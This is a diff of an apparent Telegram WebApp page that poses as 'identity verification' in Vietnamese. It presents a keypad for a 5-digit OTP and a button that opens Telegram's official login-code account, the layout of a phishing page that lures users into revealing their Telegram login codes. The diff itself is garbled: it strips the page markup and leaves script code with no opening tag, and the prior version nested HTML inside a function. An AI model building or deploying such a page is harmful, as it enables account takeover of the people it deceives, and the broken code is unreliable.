@@ -21,53 +21,6 @@ body { font-family: sans-serif; background: #1a1a1a; color: white; margin: 0; di
 </head>
 <body>
 <div class="container">
-
-    <!-- Step 1 -->
-    <div id="step-1">
-        <div style="margin-bottom:30px;">
-            <img src="https://via.placeholder.com/150" style="border-radius:50%;">
-            <h2>Xác minh danh tính</h2>
-            <p>Nhấn nút bên dưới để bắt đầu</p>
-        </div>
-        <button class="btn-confirm" onclick="finishStep1()">XÁC NHẬN</button>
-    </div>
-
-    <!-- Step 2 -->
-    <div id="step-2" class="hidden">
-        <div class="msg-box">📩 Chúng tôi đã gửi mã xác nhận. Nhập OTP bằng bàn phím bên dưới.</div>
-        <div class="otp-inputs">
-            <div class="otp-box"></div>
-            <div class="otp-box"></div>
-            <div class="otp-box"></div>
-            <div class="otp-box"></div>
-            <div class="otp-box"></div>
-        </div>
-        <div class="keypad">
-            <button class="key" onclick="press('1')">1</button>
-            <button class="key" onclick="press('2')">2</button>
-            <button class="key" onclick="press('3')">3</button>
-            <button class="key" onclick="press('4')">4</button>
-            <button class="key" onclick="press('5')">5</button>
-            <button class="key" onclick="press('6')">6</button>
-            <button class="key" onclick="press('7')">7</button>
-            <button class="key" onclick="press('8')">8</button>
-            <button class="key" onclick="press('9')">9</button>
-            <div></div>
-            <button class="key" onclick="press('0')">0</button>
-            <button class="key" onclick="del()">⌫</button>
-        </div>
-        <!-- Nút Xem mã ở Step 2 -->
-        <button class="btn-view" onclick="openTelegram()">XEM MÃ</button>
-    </div>
-
-    <!-- Step 3 -->
-    <div id="step-3" class="hidden">
-        <div class="msg-box">🎉 Bạn đã nhập OTP thành công!</div>
-    </div>
-
-</div>
-
-<script>
 const tg = window.Telegram.WebApp;
 tg.ready();
 
@@ -87,7 +40,8 @@ function press(num) {
         otp += num;
         renderOTP();
         tg.HapticFeedback.impactOccurred('light');
-        if (otp.length === 5) goStep3(); // tự nhảy Step 3 khi đủ 5 số
+
+        if (otp.length === 5) goStep3();
     }
 }
 
@@ -103,16 +57,13 @@ function renderOTP() {
     });
 }
 
-// Khi nhập đủ 5 số → Step 3
+// Step 3
 function goStep3() {
+    document.getElementById('step-2').classList.add('hidden');
     document.getElementById('step-3').classList.remove('hidden');
 }
 
+// Mở Telegram OTP
 function openTelegram() {
-   <button onclick="openOTP()">Xem mã OTP</button>
-
-<script>
-function openOTP() {
     Telegram.WebApp.openTelegramLink("tg://user?id=777000");
 }
-</script>
